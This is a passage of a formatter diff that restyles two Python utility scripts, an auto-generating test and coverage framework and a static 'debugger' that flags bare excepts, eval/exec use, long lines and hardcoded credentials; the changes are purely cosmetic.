\"functions\": [],\n+                \"imports\": [],\n+                \"lines\": source.count(\"\\n\") + 1,\n+                \"complexity\": 0,\n             }\n-            \n+\n             for node in ast.walk(tree):\n                 if isinstance(node, ast.ClassDef):\n-                    analysis['classes'].append({\n-                        'name': node.name,\n-                        'line': node.lineno,\n-                        'methods': [n.name for n in node.body if isinstance(n, ast.FunctionDef)]\n-                    })\n+                    analysis[\"classes\"].append(\n+                        {\n+                            \"name\": node.name,\n+                            \"line\": node.lineno,\n+                            \"methods\": [\n+                                n.name\n+                                for n in node.body\n+                                if isinstance(n, ast.FunctionDef)\n+                            ],\n+                        }\n+                    )\n                 elif isinstance(node, ast.FunctionDef):\n-                    analysis['functions'].append({\n-                        'name': node.name,\n-                        'line': node.lineno,\n-                        'args': len(node.args.args)\n-                    })\n+                    analysis[\"functions\"].append(\n+                        {\n+                            \"name\": node.name,\n+                            \"line\": node.lineno,\n+                            \"args\": len(node.args.args),\n+                        }\n+                    )\n                 elif isinstance(node, ast.Import):\n                     for alias in node.names:\n-                        analysis['imports'].append(alias.name)\n+                        analysis[\"imports\"].append(alias.name)\n                 elif isinstance(node, ast.ImportFrom):\n                     if node.module:\n-                        analysis['imports'].append(node.module)\n-                        \n+                        analysis[\"imports\"].append(node.module)\n+\n                 # Calculate cyclomatic complexity\n-                if isinstance(node, (ast.If, ast.For, ast.While, ast.With, \n-                                   ast.Try, ast.ExceptHandler, ast.comprehension)):\n-                    analysis['complexity'] += 1\n-                    \n+                if isinstance(\n+                    node,\n+                    (\n+                        ast.If,\n+                        ast.For,\n+                        ast.While,\n+                        ast.With,\n+                        ast.Try,\n+                        ast.ExceptHandler,\n+                        ast.comprehension,\n+                    ),\n+                ):\n+                    analysis[\"complexity\"] += 1\n+\n             return analysis\n-            \n+\n         except Exception as e:\n-            return {'error': str(e), 'lines': 0, 'complexity': 0}\n-            \n+            return {\"error\": str(e), \"lines\": 0, \"complexity\": 0}\n+\n     def generate_tests_for_file(self, file_path: Path, analysis: Dict[str, Any]) -> str:\n         \"\"\"Generate comprehensive tests for a Python file\"\"\"\n-        module_name = str(file_path).replace('/', '.').replace('.py', '')\n-        \n+        module_name = str(file_path).replace(\"/\", \".\").replace(\".py\", \"\")\n+\n         test_code = f'''#!/usr/bin/env python3\n \"\"\"\n Auto-generated comprehensive tests for {file_path}\n Generated by ComprehensiveTestFramework\n \"\"\"\n@@ -117,11 +147,11 @@\n             shutil.rmtree(self.temp_dir)\n     \n '''\n \n         # Generate tests for each function\n-        for func in analysis.get('functions', []):\n+        for func in analysis.get(\"functions\", []):\n             test_code += f'''\n     def test_{func['name']}_exists(self):\n         \"\"\"Test that {func['name']} function exists\"\"\"\n         try:\n             import {module_name}\n@@ -139,11 +169,11 @@\n         except ImportError:\n             self.skipTest(f\"Module {module_name} could not be imported\")\n '''\n \n         # Generate tests for each class\n-        for cls in analysis.get('classes', []):\n+        for cls in analysis.get(\"classes\", []):\n             test_code += f'''\n     def test_{cls['name']}_class_exists(self):\n         \"\"\"Test that {cls['name']} class exists\"\"\"\n         try:\n             import {module_name}\n@@ -171,11 +201,11 @@\n         except ImportError:\n             self.skipTest(f\"Module {module_name} could not be imported\")\n '''\n \n             # Generate tests for class methods\n-            for method in cls.get('methods', []):\n+            for method in cls.get(\"methods\", []):\n                 test_code += f'''\n     def test_{cls['name']}_{method}_method(self):\n         \"\"\"Test {cls['name']}.{method} method\"\"\"\n         try:\n             import {module_name}\n@@ -189,148 +219,160 @@\n                 self.assertTrue(callable(getattr(instance, '{method}')))\n         except ImportError:\n             self.skipTest(f\"Module {module_name} could not be imported\")\n '''\n \n-        test_code += '''\n+        test_code += \"\"\"\n if __name__ == '__main__':\n     unittest.main()\n-'''\n-        \n+\"\"\"\n+\n         return test_code\n-        \n+\n     def run_comprehensive_coverage(self) -> Dict[str, Any]:\n         \"\"\"Run comprehensive coverage analysis\"\"\"\n         print(\"\ud83d\udd0d Starting comprehensive coverage analysis...\")\n-        \n+\n         # Start coverage tracking\n         self.coverage_instance.start()\n-        \n+\n         try:\n             # Discover and analyze all Python files\n             python_files = self.discover_all_python_files()\n             total_files = len(python_files)\n-            \n+\n             print(f\"\ud83d\udcc1 Discovered {total_files} Python files\")\n-            \n+\n             coverage_results = {}\n-            \n+\n             for i, file_path in enumerate(python_files, 1):\n                 print(f\"\ud83d\udcca Analyzing {file_path} ({i}/{total_files})\")\n-                \n+\n                 try:\n                     # Analyze file structure\n                     analysis = self.analyze_file_structure(file_path)\n-                    \n+\n                     # Generate and run tests\n                     test_code = self.generate_tests_for_file(file_path, analysis)\n-                    \n+\n                     # Save generated test\n-                    test_file = Path(f'/tmp/test_auto_{file_path.stem}.py')\n-                    with open(test_file, 'w') as f:\n+                    test_file = Path(f\"/tmp/test_auto_{file_path.stem}.py\")\n+                    with open(test_file, \"w\") as f:\n                         f.write(test_code)\n-                    \n+\n                     # Run the generated test\n-                    result = subprocess.run([\n-                        sys.executable, str(test_file)\n-                    ], capture_output=True, text=True, timeout=60)\n-                    \n+                    result = subprocess.run(\n+                        [sys.executable, str(test_file)],\n+                        capture_output=True,\n+                        text=True,\n+                        timeout=60,\n+                    )\n+\n                     coverage_results[str(file_path)] = {\n-                        'analysis': analysis,\n-                        'test_result': {\n-                            'returncode': result.returncode,\n-                            'stdout': result.stdout[-1000:],  # Last 1000 chars\n-                            'stderr': result.stderr[-1000:] if result.stderr else ''\n+                        \"analysis\": analysis,\n+                        \"test_result\": {\n+                            \"returncode\": result.returncode,\n+                            \"stdout\": result.stdout[-1000:],  # Last 1000 chars\n+                            \"stderr\": result.stderr[-1000:] if result.stderr else \"\",\n                         },\n-                        'lines_analyzed': analysis.get('lines', 0),\n-                        'functions_tested': len(analysis.get('functions', [])),\n-                        'classes_tested': len(analysis.get('classes', []))\n+                        \"lines_analyzed\": analysis.get(\"lines\", 0),\n+                        \"functions_tested\": len(analysis.get(\"functions\", [])),\n+                        \"classes_tested\": len(analysis.get(\"classes\", [])),\n                     }\n-                    \n+\n                 except Exception as e:\n                     coverage_results[str(file_path)] = {\n-                        'error': str(e),\n-                        'analysis': {'lines': 0, 'complexity': 0}\n+                        \"error\": str(e),\n+                        \"analysis\": {\"lines\": 0, \"complexity\": 0},\n                     }\n-                    \n+\n         finally:\n             # Stop coverage tracking\n             self.coverage_instance.stop()\n             self.coverage_instance.save()\n-            \n+\n         return coverage_results\n-        \n+\n     def generate_line_by_line_report(self, coverage_results: Dict[str, Any]) -> str:\n         \"\"\"Generate detailed line-by-line coverage report\"\"\"\n-        \n+\n         # Get coverage data\n         try:\n             coverage_data = self.coverage_instance.get_data()\n         except:\n             coverage_data = None\n-            \n+\n         report = \"# \ud83d\udcca Comprehensive Test Coverage Report\\n\\n\"\n         report += f\"Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\\n\\n\"\n-        \n+\n         # Summary statistics\n         total_files = len(coverage_results)\n-        successful_files = sum(1 for r in coverage_results.values() \n-                             if 'error' not in r and r.get('test_result', {}).get('returncode') == 0)\n-        total_lines = sum(r.get('analysis', {}).get('lines', 0) for r in coverage_results.values())\n-        total_functions = sum(r.get('functions_tested', 0) for r in coverage_results.values())\n-        total_classes = sum(r.get('classes_tested', 0) for r in coverage_results.values())\n-        \n+        successful_files = sum(\n+            1\n+            for r in coverage_results.values()\n+            if \"error\" not in r and r.get(\"test_result\", {}).get(\"returncode\") == 0\n+        )\n+        total_lines = sum(\n+            r.get(\"analysis\", {}).get(\"lines\", 0) for r in coverage_results.values()\n+        )\n+        total_functions = sum(\n+            r.get(\"functions_tested\", 0) for r in coverage_results.values()\n+        )\n+        total_classes = sum(\n+            r.get(\"classes_tested\", 0) for r in coverage_results.values()\n+        )\n+\n         report += f\"## \ud83d\udcc8 Summary Statistics\\n\\n\"\n         report += f\"- **Total Files Analyzed**: {total_files}\\n\"\n         report += f\"- **Successfully Tested**: {successful_files} ({successful_files/total_files*100:.1f}%)\\n\"\n         report += f\"- **Total Lines of Code**: {total_lines}\\n\"\n         report += f\"- **Functions Tested**: {total_functions}\\n\"\n         report += f\"- **Classes Tested**: {total_classes}\\n\\n\"\n-        \n+\n         # Detailed file analysis\n         report += \"## \ud83d\udcc1 Detailed File Analysis\\n\\n\"\n-        \n+\n         for file_path, result in coverage_results.items():\n-            if 'error' in result:\n+            if \"error\" in result:\n                 report += f\"### \u274c {file_path}\\n\"\n                 report += f\"**Error**: {result['error']}\\n\\n\"\n                 continue\n-                \n-            analysis = result.get('analysis', {})\n-            test_result = result.get('test_result', {})\n-            \n-            status = \"\u2705\" if test_result.get('returncode') == 0 else \"\u26a0\ufe0f\"\n+\n+            analysis = result.get(\"analysis\", {})\n+            test_result = result.get(\"test_result\", {})\n+\n+            status = \"\u2705\" if test_result.get(\"returncode\") == 0 else \"\u26a0\ufe0f\"\n             report += f\"### {status} {file_path}\\n\\n\"\n-            \n+\n             report += f\"- **Lines of Code**: {analysis.get('lines', 0)}\\n\"\n             report += f\"- **Cyclomatic Complexity**: {analysis.get('complexity', 0)}\\n\"\n             report += f\"- **Functions**: {len(analysis.get('functions', []))}\\n\"\n             report += f\"- **Classes**: {len(analysis.get('classes', []))}\\n\"\n             report += f\"- **Imports**: {len(analysis.get('imports', []))}\\n\"\n-            \n-            if test_result.get('returncode') != 0:\n+\n+            if test_result.get(\"returncode\") != 0:\n                 report += f\"- **Test Status**: Failed (exit code {test_result.get('returncode')})\\n\"\n-                if test_result.get('stderr'):\n+                if test_result.get(\"stderr\"):\n                     report += f\"- **Error Output**: ```\\n{test_result['stderr']}\\n```\\n\"\n             else:\n                 report += f\"- **Test Status**: Passed\\n\"\n-                \n+\n             # List functions and classes\n-            if analysis.get('functions'):\n+            if analysis.get(\"functions\"):\n                 report += \"- **Functions Found**:\\n\"\n-                for func in analysis['functions']:\n+                for func in analysis[\"functions\"]:\n                     report += f\"  - `{func['name']}()` (line {func['line']})\\n\"\n-                    \n-            if analysis.get('classes'):\n+\n+            if analysis.get(\"classes\"):\n                 report += \"- **Classes Found**:\\n\"\n-                for cls in analysis['classes']:\n+                for cls in analysis[\"classes\"]:\n                     report += f\"  - `{cls['name']}` (line {cls['line']})\\n\"\n-                    for method in cls.get('methods', []):\n+                    for method in cls.get(\"methods\", []):\n                         report += f\"    - `{method}()`\\n\"\n-                        \n+\n             report += \"\\n\"\n-            \n+\n         # Coverage data if available\n         if coverage_data:\n             report += \"## \ud83c\udfaf Line Coverage Data\\n\\n\"\n             try:\n                 for filename in coverage_data.measured_files():\n@@ -342,118 +384,140 @@\n                         if len(lines) > 20:\n                             report += f\"  ... and {len(lines) - 20} more\\n\"\n                         report += \"\\n\"\n             except Exception as e:\n                 report += f\"Error processing coverage data: {e}\\n\"\n-                \n+\n         return report\n-        \n+\n     def run_recursive_improvement(self) -> Dict[str, Any]:\n         \"\"\"Run recursive improvement analysis\"\"\"\n         print(\"\ud83d\udd04 Running recursive improvement analysis...\")\n-        \n+\n         improvement_suggestions = {}\n-        \n+\n         # Analyze common patterns and issues\n         python_files = self.discover_all_python_files()\n-        \n+\n         for file_path in python_files:\n             suggestions = []\n-            \n+\n             try:\n-                with open(file_path, 'r', encoding='utf-8') as f:\n+                with open(file_path, \"r\", encoding=\"utf-8\") as f:\n                     content = f.read()\n-                    \n+\n                 # Check for common improvement opportunities\n-                if 'TODO' in content or 'FIXME' in content:\n+                if \"TODO\" in content or \"FIXME\" in content:\n                     suggestions.append(\"Contains TODO/FIXME comments - needs attention\")\n-                    \n-                if content.count('except:') > 0:\n-                    suggestions.append(\"Uses bare except clauses - should specify exception types\")\n-                    \n-                if content.count('print(') > 5:\n-                    suggestions.append(\"Uses many print statements - consider using logging\")\n-                    \n-                if 'eval(' in content or 'exec(' in content:\n+\n+                if content.count(\"except:\") > 0:\n+                    suggestions.append(\n+                        \"Uses bare except clauses - should specify exception types\"\n+                    )\n+\n+                if content.count(\"print(\") > 5:\n+                    suggestions.append(\n+                        \"Uses many print statements - consider using logging\"\n+                    )\n+\n+                if \"eval(\" in content or \"exec(\" in content:\n                     suggestions.append(\"Uses eval/exec - potential security risk\")\n-                    \n+\n                 # Check for code complexity\n                 analysis = self.analyze_file_structure(file_path)\n-                if analysis.get('complexity', 0) > 10:\n-                    suggestions.append(f\"High cyclomatic complexity ({analysis['complexity']}) - consider refactoring\")\n-                    \n-                if analysis.get('lines', 0) > 500:\n-                    suggestions.append(f\"Large file ({analysis['lines']} lines) - consider splitting\")\n-                    \n+                if analysis.get(\"complexity\", 0) > 10:\n+                    suggestions.append(\n+                        f\"High cyclomatic complexity ({analysis['complexity']}) - consider refactoring\"\n+                    )\n+\n+                if analysis.get(\"lines\", 0) > 500:\n+                    suggestions.append(\n+                        f\"Large file ({analysis['lines']} lines) - consider splitting\"\n+                    )\n+\n                 if suggestions:\n                     improvement_suggestions[str(file_path)] = suggestions\n-                    \n+\n             except Exception as e:\n                 improvement_suggestions[str(file_path)] = [f\"Analysis error: {e}\"]\n-                \n+\n         return improvement_suggestions\n-        \n-    def generate_automated_fixes(self, improvement_suggestions: Dict[str, Any]) -> List[str]:\n+\n+    def generate_automated_fixes(\n+        self, improvement_suggestions: Dict[str, Any]\n+    ) -> List[str]:\n         \"\"\"Generate automated fixes for common issues\"\"\"\n         fixes = []\n-        \n+\n         for file_path, suggestions in improvement_suggestions.items():\n             for suggestion in suggestions:\n                 if \"bare except\" in suggestion:\n-                    fixes.append(f\"# Fix for {file_path}: Replace bare except with specific exceptions\")\n+                    fixes.append(\n+                        f\"# Fix for {file_path}: Replace bare except with specific exceptions\"\n+                    )\n                 elif \"print statements\" in suggestion:\n                     fixes.append(f\"# Fix for {file_path}: Replace print with logging\")\n                 elif \"eval/exec\" in suggestion:\n-                    fixes.append(f\"# Security fix for {file_path}: Replace eval/exec with safer alternatives\")\n-                    \n+                    fixes.append(\n+                        f\"# Security fix for {file_path}: Replace eval/exec with safer alternatives\"\n+                    )\n+\n         return fixes\n-        \n+\n     def run_full_framework(self) -> int:\n         \"\"\"Run the complete comprehensive test framework\"\"\"\n         print(\"\ud83d\ude80 Starting Comprehensive Test Automation Framework\")\n         print(\"=\" * 60)\n-        \n+\n         # Phase 1: Coverage Analysis\n         coverage_results = self.run_comprehensive_coverage()\n-        \n+\n         # Phase 2: Generate detailed report\n         detailed_report = self.generate_line_by_line_report(coverage_results)\n-        \n+\n         # Phase 3: Recursive improvement\n         improvement_suggestions = self.run_recursive_improvement()\n-        \n+\n         # Phase 4: Generate fixes\n         automated_fixes = self.generate_automated_fixes(improvement_suggestions)\n-        \n+\n         # Save all reports\n-        with open('comprehensive-test-report.md', 'w') as f:\n+        with open(\"comprehensive-test-report.md\", \"w\") as f:\n             f.write(detailed_report)\n-            \n-        with open('improvement-suggestions.json', 'w') as f:\n+\n+        with open(\"improvement-suggestions.json\", \"w\") as f:\n             json.dump(improvement_suggestions, f, indent=2)\n-            \n-        with open('automated-fixes.txt', 'w') as f:\n-            f.write('\\n'.join(automated_fixes))\n-            \n+\n+        with open(\"automated-fixes.txt\", \"w\") as f:\n+            f.write(\"\\n\".join(automated_fixes))\n+\n         # Summary\n         total_files = len(coverage_results)\n-        successful_tests = sum(1 for r in coverage_results.values() \n-                             if 'error' not in r and r.get('test_result', {}).get('returncode') == 0)\n-        \n+        successful_tests = sum(\n+            1\n+            for r in coverage_results.values()\n+            if \"error\" not in r and r.get(\"test_result\", {}).get(\"returncode\") == 0\n+        )\n+\n         success_rate = (successful_tests / total_files * 100) if total_files > 0 else 0\n-        \n+\n         print(f\"\\n\u2705 Framework execution completed!\")\n-        print(f\"\ud83d\udcca Success Rate: {success_rate:.1f}% ({successful_tests}/{total_files})\")\n+        print(\n+            f\"\ud83d\udcca Success Rate: {success_rate:.1f}% ({successful_tests}/{total_files})\"\n+        )\n         print(f\"\ud83d\udcc1 Reports generated:\")\n         print(f\"  - comprehensive-test-report.md\")\n         print(f\"  - improvement-suggestions.json\")\n         print(f\"  - automated-fixes.txt\")\n-        \n+\n         if len(improvement_suggestions) > 0:\n-            print(f\"\ud83d\udd27 Found {len(improvement_suggestions)} files with improvement opportunities\")\n-            \n+            print(\n+                f\"\ud83d\udd27 Found {len(improvement_suggestions)} files with improvement opportunities\"\n+            )\n+\n         return 0 if success_rate >= 90 else 1\n \n-if __name__ == '__main__':\n+\n+if __name__ == \"__main__\":\n     framework = ComprehensiveTestFramework()\n     exit_code = framework.run_full_framework()\n-    sys.exit(exit_code)\n\\ No newline at end of file\n+    sys.exit(exit_code)\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/intelligent_debugger.py\t2025-09-14 19:20:22.080107+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/intelligent_debugger.py\t2025-09-14 19:23:13.508230+00:00\n@@ -16,528 +16,581 @@\n from typing import Dict, List, Any, Tuple, Optional\n import logging\n from dataclasses import dataclass\n from collections import defaultdict\n \n+\n @dataclass\n class ErrorPattern:\n     \"\"\"Represents a detected error pattern\"\"\"\n+\n     pattern_type: str\n     severity: str\n     message: str\n     file_path: str\n     line_number: int\n     suggested_fix: str\n     confidence: float\n \n+\n class IntelligentDebugger:\n     def __init__(self):\n         self.error_patterns = []\n         self.fix_suggestions = []\n         self.analysis_results = {}\n-        \n+\n         # Common error patterns and their fixes\n         self.known_patterns = {\n-            'syntax_errors': [\n-                {\n-                    'pattern': r'SyntaxError: invalid syntax',\n-                    'fix': 'Check for missing colons, parentheses, or quotes',\n-                    'confidence': 0.9\n-                },\n-                {\n-                    'pattern': r'IndentationError',\n-                    'fix': 'Fix indentation - use consistent spaces or tabs',\n-                    'confidence': 0.95\n-                }\n+            \"syntax_errors\": [\n+                {\n+                    \"pattern\": r\"SyntaxError: invalid syntax\",\n+                    \"fix\": \"Check for missing colons, parentheses, or quotes\",\n+                    \"confidence\": 0.9,\n+                },\n+                {\n+                    \"pattern\": r\"IndentationError\",\n+                    \"fix\": \"Fix indentation - use consistent spaces or tabs\",\n+                    \"confidence\": 0.95,\n+                },\n             ],\n-            'import_errors': [\n-                {\n-                    'pattern': r'ModuleNotFoundError: No module named',\n-                    'fix': 'Install missing module with pip or check import path',\n-                    'confidence': 0.9\n-                },\n-                {\n-                    'pattern': r'ImportError: cannot import name',\n-                    'fix': 'Check if the imported name exists in the module',\n-                    'confidence': 0.85\n-                }\n+            \"import_errors\": [\n+                {\n+                    \"pattern\": r\"ModuleNotFoundError: No module named\",\n+                    \"fix\": \"Install missing module with pip or check import path\",\n+                    \"confidence\": 0.9,\n+                },\n+                {\n+                    \"pattern\": r\"ImportError: cannot import name\",\n+                    \"fix\": \"Check if the imported name exists in the module\",\n+                    \"confidence\": 0.85,\n+                },\n             ],\n-            'runtime_errors': [\n-                {\n-                    'pattern': r'NameError: name .* is not defined',\n-                    'fix': 'Define the variable or check for typos',\n-                    'confidence': 0.9\n-                },\n-                {\n-                    'pattern': r'AttributeError: .* has no attribute',\n-                    'fix': 'Check if the attribute exists or if object is None',\n-                    'confidence': 0.85\n-                },\n-                {\n-                    'pattern': r'KeyError:',\n-                    'fix': 'Check if key exists in dictionary or use .get() method',\n-                    'confidence': 0.8\n-                }\n-            ]\n+            \"runtime_errors\": [\n+                {\n+                    \"pattern\": r\"NameError: name .* is not defined\",\n+                    \"fix\": \"Define the variable or check for typos\",\n+                    \"confidence\": 0.9,\n+                },\n+                {\n+                    \"pattern\": r\"AttributeError: .* has no attribute\",\n+                    \"fix\": \"Check if the attribute exists or if object is None\",\n+                    \"confidence\": 0.85,\n+                },\n+                {\n+                    \"pattern\": r\"KeyError:\",\n+                    \"fix\": \"Check if key exists in dictionary or use .get() method\",\n+                    \"confidence\": 0.8,\n+                },\n+            ],\n         }\n-        \n+\n     def analyze_file_for_errors(self, file_path: Path) -> List[ErrorPattern]:\n         \"\"\"Analyze a single file for potential errors\"\"\"\n         errors = []\n-        \n+\n         try:\n-            with open(file_path, 'r', encoding='utf-8') as f:\n+            with open(file_path, \"r\", encoding=\"utf-8\") as f:\n                 content = f.read()\n-                \n+\n             # Parse AST to detect syntax issues\n             try:\n                 tree = ast.parse(content)\n                 errors.extend(self._analyze_ast_patterns(tree, file_path, content))\n             except SyntaxError as e:\n-                errors.append(ErrorPattern(\n-                    pattern_type='syntax_error',\n-                    severity='high',\n-                    message=f\"Syntax error: {e.msg}\",\n-                    file_path=str(file_path),\n-                    line_number=e.lineno or 0,\n-                    suggested_fix=\"Fix syntax error according to Python grammar rules\",\n-                    confidence=0.95\n-                ))\n+                errors.append(\n+                    ErrorPattern(\n+                        pattern_type=\"syntax_error\",\n+                        severity=\"high\",\n+                        message=f\"Syntax error: {e.msg}\",\n+                        file_path=str(file_path),\n+                        line_number=e.lineno or 0,\n+                        suggested_fix=\"Fix syntax error according to Python grammar rules\",\n+                        confidence=0.95,\n+                    )\n+                )\n             except Exception as e:\n-                errors.append(ErrorPattern(\n-                    pattern_type='parse_error',\n-                    severity='medium',\n-                    message=f\"Parse error: {str(e)}\",\n+                errors.append(\n+                    ErrorPattern(\n+                        pattern_type=\"parse_error\",\n+                        severity=\"medium\",\n+                        message=f\"Parse error: {str(e)}\",\n+                        file_path=str(file_path),\n+                        line_number=0,\n+                        suggested_fix=\"Check file encoding and syntax\",\n+                        confidence=0.7,\n+                    )\n+                )\n+\n+            # Analyze content patterns\n+            errors.extend(self._analyze_content_patterns(content, file_path))\n+\n+        except Exception as e:\n+            errors.append(\n+                ErrorPattern(\n+                    pattern_type=\"file_error\",\n+                    severity=\"medium\",\n+                    message=f\"Could not analyze file: {str(e)}\",\n                     file_path=str(file_path),\n                     line_number=0,\n-                    suggested_fix=\"Check file encoding and syntax\",\n-                    confidence=0.7\n-                ))\n-                \n-            # Analyze content patterns\n-            errors.extend(self._analyze_content_patterns(content, file_path))\n-            \n-        except Exception as e:\n-            errors.append(ErrorPattern(\n-                pattern_type='file_error',\n-                severity='medium',\n-                message=f\"Could not analyze file: {str(e)}\",\n-                file_path=str(file_path),\n-                line_number=0,\n-                suggested_fix=\"Check file permissions and encoding\",\n-                confidence=0.5\n-            ))\n-            \n+                    suggested_fix=\"Check file permissions and encoding\",\n+                    confidence=0.5,\n+                )\n+            )\n+\n         return errors\n-        \n-    def _analyze_ast_patterns(self, tree: ast.AST, file_path: Path, content: str) -> List[ErrorPattern]:\n+\n+    def _analyze_ast_patterns(\n+        self, tree: ast.AST, file_path: Path, content: str\n+    ) -> List[ErrorPattern]:\n         \"\"\"Analyze AST for common error patterns\"\"\"\n         errors = []\n-        lines = content.split('\\n')\n-        \n+        lines = content.split(\"\\n\")\n+\n         for node in ast.walk(tree):\n             # Check for potential issues\n-            \n+\n             # Bare except clauses\n             if isinstance(node, ast.ExceptHandler) and node.type is None:\n-                errors.append(ErrorPattern(\n-                    pattern_type='code_quality',\n-                    severity='medium',\n-                    message=\"Bare except clause detected\",\n-                    file_path=str(file_path),\n-                    line_number=node.lineno,\n-                    suggested_fix=\"Specify exception type: except SpecificException:\",\n-                    confidence=0.9\n-                ))\n-                \n+                errors.append(\n+                    ErrorPattern(\n+                        pattern_type=\"code_quality\",\n+                        severity=\"medium\",\n+                        message=\"Bare except clause detected\",\n+                        file_path=str(file_path),\n+                        line_number=node.lineno,\n+                        suggested_fix=\"Specify exception type: except SpecificException:\",\n+                        confidence=0.9,\n+                    )\n+                )\n+\n             # Unused variables (simplified detection)\n             if isinstance(node, ast.Name) and isinstance(node.ctx, ast.Store):\n                 var_name = node.id\n-                if var_name.startswith('_') and len(var_name) > 1:\n+                if var_name.startswith(\"_\") and len(var_name) > 1:\n                     # This is likely intentionally unused\n                     continue\n-                    \n+\n                 # Check if variable is used later (simplified check)\n                 used = False\n                 for other_node in ast.walk(tree):\n-                    if (isinstance(other_node, ast.Name) and \n-                        other_node.id == var_name and \n-                        isinstance(other_node.ctx, ast.Load) and\n-                        other_node.lineno > node.lineno):\n+                    if (\n+                        isinstance(other_node, ast.Name)\n+                        and other_node.id == var_name\n+                        and isinstance(other_node.ctx, ast.Load)\n+                        and other_node.lineno > node.lineno\n+                    ):\n                         used = True\n                         break\n-                        \n+\n                 if not used:\n-                    errors.append(ErrorPattern(\n-                        pattern_type='unused_variable',\n-                        severity='low',\n-                        message=f\"Variable '{var_name}' appears to be unused\",\n-                        file_path=str(file_path),\n-                        line_number=node.lineno,\n-                        suggested_fix=f\"Remove unused variable or prefix with underscore: _{var_name}\",\n-                        confidence=0.7\n-                    ))\n-                    \n+                    errors.append(\n+                        ErrorPattern(\n+                            pattern_type=\"unused_variable\",\n+                            severity=\"low\",\n+                            message=f\"Variable '{var_name}' appears to be unused\",\n+                            file_path=str(file_path),\n+                            line_number=node.lineno,\n+                            suggested_fix=f\"Remove unused variable or prefix with underscore: _{var_name}\",\n+                            confidence=0.7,\n+                        )\n+                    )\n+\n             # Dangerous function calls\n             if isinstance(node, ast.Call):\n                 if isinstance(node.func, ast.Name):\n                     func_name = node.func.id\n-                    if func_name in ['eval', 'exec']:\n-                        errors.append(ErrorPattern(\n-                            pattern_type='security_risk',\n-                            severity='high',\n-                            message=f\"Dangerous function '{func_name}' detected\",\n-                            file_path=str(file_path),\n-                            line_number=node.lineno,\n-                            suggested_fix=f\"Replace {func_name} with safer alternatives\",\n-                            confidence=0.95\n-                        ))\n-                        \n+                    if func_name in [\"eval\", \"exec\"]:\n+                        errors.append(\n+                            ErrorPattern(\n+                                pattern_type=\"security_risk\",\n+                                severity=\"high\",\n+                                message=f\"Dangerous function '{func_name}' detected\",\n+                                file_path=str(file_path),\n+                                line_number=node.lineno,\n+                                suggested_fix=f\"Replace {func_name} with safer alternatives\",\n+                                confidence=0.95,\n+                            )\n+                        )\n+\n             # Complex conditions (too many boolean operators)\n             if isinstance(node, ast.BoolOp):\n                 if len(node.values) > 3:\n-                    errors.append(ErrorPattern(\n-                        pattern_type='complexity',\n-                        severity='medium',\n-                        message=\"Complex boolean expression detected\",\n-                        file_path=str(file_path),\n-                        line_number=node.lineno,\n-                        suggested_fix=\"Break down complex condition into multiple variables\",\n-                        confidence=0.8\n-                    ))\n-                    \n+                    errors.append(\n+                        ErrorPattern(\n+                            pattern_type=\"complexity\",\n+                            severity=\"medium\",\n+                            message=\"Complex boolean expression detected\",\n+                            file_path=str(file_path),\n+                            line_number=node.lineno,\n+                            suggested_fix=\"Break down complex condition into multiple variables\",\n+                            confidence=0.8,\n+                        )\n+                    )\n+\n         return errors\n-        \n-    def _analyze_content_patterns(self, content: str, file_path: Path) -> List[ErrorPattern]:\n+\n+    def _analyze_content_patterns(\n+        self, content: str, file_path: Path\n+    ) -> List[ErrorPattern]:\n         \"\"\"Analyze file content for error patterns\"\"\"\n         errors = []\n-        lines = content.split('\\n')\n-        \n+        lines = content.split(\"\\n\")\n+\n         for i, line in enumerate(lines, 1):\n             # Check for common issues\n-            \n+\n             # Long lines\n             if len(line) > 120:\n-                errors.append(ErrorPattern(\n-                    pattern_type='style',\n-                    severity='low',\n-                    message=f\"Line too long ({len(line)} characters)\",\n-                    file_path=str(file_path),\n-                    line_number=i,\n-                    suggested_fix=\"Break long line into multiple lines\",\n-                    confidence=0.8\n-                ))\n-                \n+                errors.append(\n+                    ErrorPattern(\n+                        pattern_type=\"style\",\n+                        severity=\"low\",\n+                        message=f\"Line too long ({len(line)} characters)\",\n+                        file_path=str(file_path),\n+                        line_number=i,\n+                        suggested_fix=\"Break long line into multiple lines\",\n+                        confidence=0.8,\n+                    )\n+                )\n+\n             # Hardcoded credentials patterns\n             credential_patterns = [\n                 r'password\\s*=\\s*[\"\\'][^\"\\']+[\"\\']',\n                 r'api_key\\s*=\\s*[\"\\'][^\"\\']+[\"\\']',\n                 r'secret\\s*=\\s*[\"\\'][^\"\\']+[\"\\']',\n-                r'token\\s*=\\s*[\"\\'][^\"\\']+[\"\\']'\n+                r'token\\s*=\\s*[\"\\'][^\"\\']+[\"\\']',\n             ]\n-            \n+\n             for pattern in credential_patterns:\n                 if re.search(pattern, line, re.IGNORECASE):\n-                    errors.append(ErrorPattern(\n-                        pattern_type='security_risk',\n-                        severity='critical',\n-                        message=\"Potential hardcoded credential detected\",\n+                    errors.append(\n+                        ErrorPattern(\n+                            pattern_type=\"security_risk\",\n+                            severity=\"critical\",\n+                            message=\"Potential hardcoded credential detected\",\n+                            file_path=str(file_path),\n+                            line_number=i,\n+                            suggested_fix=\"Move credentials to environment variables or config files\",\n+                            confidence=0.9,\n+                        )\n+                    )\n+\n+            # TODO/FIXME comments\n+            if re.search(r\"(TODO|FIXME|XXX|HACK):\", line, re.IGNORECASE):\n+                errors.append(\n+                    ErrorPattern(\n+                        pattern_type=\"maintenance\",\n+                        severity=\"low\",\n+                        message=\"TODO/FIXME comment found\",\n                         file_path=str(file_path),\n                         line_number=i,\n-                        suggested_fix=\"Move credentials to environment variables or config files\",\n-                        confidence=0.9\n-                    ))\n-                    \n-            # TODO/FIXME comments\n-            if re.search(r'(TODO|FIXME|XXX|HACK):', line, re.IGNORECASE):\n-                errors.append(ErrorPattern(\n-                    pattern_type='maintenance',\n-                    severity='low',\n-                    message=\"TODO/FIXME comment found\",\n-                    file_path=str(file_path),\n-                    line_number=i,\n-                    suggested_fix=\"Address the TODO item or create an issue\",\n-                    confidence=0.7\n-                ))\n-                \n+                        suggested_fix=\"Address the TODO item or create an issue\",\n+                        confidence=0.7,\n+                    )\n+                )\n+\n         return errors\n-        \n+\n     def run_automated_tests_with_debugging(self) -> Dict[str, Any]:\n         \"\"\"Run tests and capture debugging information\"\"\"\n         print(\"\ud83d\udc1b Running automated tests with debugging...\")\n-        \n+\n         test_results = {}\n-        